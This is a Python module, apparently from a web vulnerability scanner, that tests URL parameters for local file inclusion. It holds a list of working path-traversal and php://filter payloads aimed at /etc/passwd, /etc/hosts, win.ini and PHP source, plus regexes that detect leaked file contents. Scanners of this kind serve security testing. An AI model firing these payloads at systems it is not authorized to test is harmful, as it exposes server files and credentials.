from __future__ import annotations

import base64
import re
from urllib.parse import urlsplit

from ..models import Finding, Page, Severity
from ..utils import build_url, similarity
from .base import Check
from .common import spend, testable_params

PASSWD_RE = re.compile(r"root:x?:0:0:[^/\n]*[:/]|root:[^:\n]*:0:0:")
WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.I)
ETC_HOSTS_RE = re.compile(r"^127\.0\.0\.1\s+localhost", re.M)

PAYLOADS = [
    ("unix-traversal", "....//....//....//....//etc/passwd", PASSWD_RE),
    ("unix-absolute", "/etc/passwd", PASSWD_RE),
    ("hosts-file", "....//....//....//etc/hosts", ETC_HOSTS_RE),
    ("windows-traversal", "....\\\\....\\\\....\\\\windows\\\\win.ini", WIN_INI_RE),
    ("windows-abs", "C:/Windows/win.ini", WIN_INI_RE),
    ("php-filter", "php://filter/convert.base64-encode/resource=index.php", None),
    ("php-filter-abs", "php://filter/convert.base64-encode/resource=/etc/passwd", None),
]

FILENAME_HINT = re.compile(r"[\w./-]+\.(?:php|asp|aspx|jsp|html|txt)", re.I)
BASE64_RUN = re.compile(r"[A-Za-z0-9+/]{80,}={0,2}")


class LfiCheck(Check):
    id = "lfi"
    name = "Local file inclusion"
    description = "Path traversal and PHP wrapper probes on parameters."

    async def on_page(self, ctx, page: Page) -> None:
        if not page.ok:
            return
        tested: set[str] = ctx.state.setdefault("lfi_params_tested", set())
        for param in testable_params(page, limit=4):
            key = f"{page.url}|{param}"
            if key in tested or not spend(ctx):
                continue
            tested.add(key)
            if await self._test_param(ctx, page, param):
                return

    async def _test_param(self, ctx, page: Page, param: str) -> bool:
        original = _current_value(page, param)
        filename = _guess_filename(page.url) or "index.php"

        for label, payload, pattern in PAYLOADS:
            if not spend(ctx):
                return False
            inject = payload
            if label.startswith("php-filter"):
                inject = payload.replace("resource=index.php", f"resource={filename}") \
                    if "resource=index.php" in payload else payload
            resp = await ctx.client.get(build_url(page.url, param, original + inject))
            if resp.error or not resp.body:
                continue

            if pattern is not None and pattern.search(resp.body[:400_000]) and len(resp.body) > len(page.body):
                ctx.add(Finding(
                    id="lfi-traversal",
                    title=f"Local file inclusion via '{param}'",
                    severity=Severity.HIGH,
                    url=page.url,
                    param=param,
                    detail=f"Payload ({label}) returned file contents from the server filesystem.",
                    evidence=_snippet(resp.body, pattern),
                    remediation="Never pass raw user input to file APIs; allowlist filenames and canonicalize paths.",
                ))
                return True

            if label.startswith("php-filter"):
                decoded = _try_decode(resp.body, page.body)
                if decoded:
                    ctx.add(Finding(
                        id="lfi-php-filter",
                        title=f"Arbitrary file read via PHP filter on '{param}'",
                        severity=Severity.HIGH,
                        url=page.url,
                        param=param,
                        detail="php://filter base64-encoded the requested resource, confirming file read control.",
                        evidence=f"decoded {len(decoded)} bytes of {filename} source",
                        remediation="Validate/allowlist file parameters; disable wrappers for user input.",
                    ))
                    return True
        return False


def _try_decode(body: str, baseline: str) -> str:
    for match in BASE64_RUN.finditer(body[:400_000]):
        blob = match.group(0)
        try:
            decoded = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            continue
        if similarity(decoded, baseline) > 0.80 or "<html" in decoded[:500].lower() or "<?php" in decoded[:500]:
            return decoded
    return ""


def _current_value(page: Page, param: str) -> str:
    from urllib.parse import parse_qsl

    for key, value in parse_qsl(urlsplit(page.url).query, keep_blank_values=True):
        if key == param:
            return value
    return ""


def _guess_filename(url: str) -> str:
    path = urlsplit(url).path
    match = FILENAME_HINT.search(path)
    if match:
        return match.group(0).rsplit("/", 1)[-1]
    return "index.php"


def _snippet(body: str, pattern: re.Pattern, size: int = 200) -> str:
    match = pattern.search(body[:400_000])
    if not match:
        return body[:size]
    start = max(0, match.start() - 80)
    return re.sub(r"[ \t]+", " ", body[start : match.start() + size]).strip()[:size]
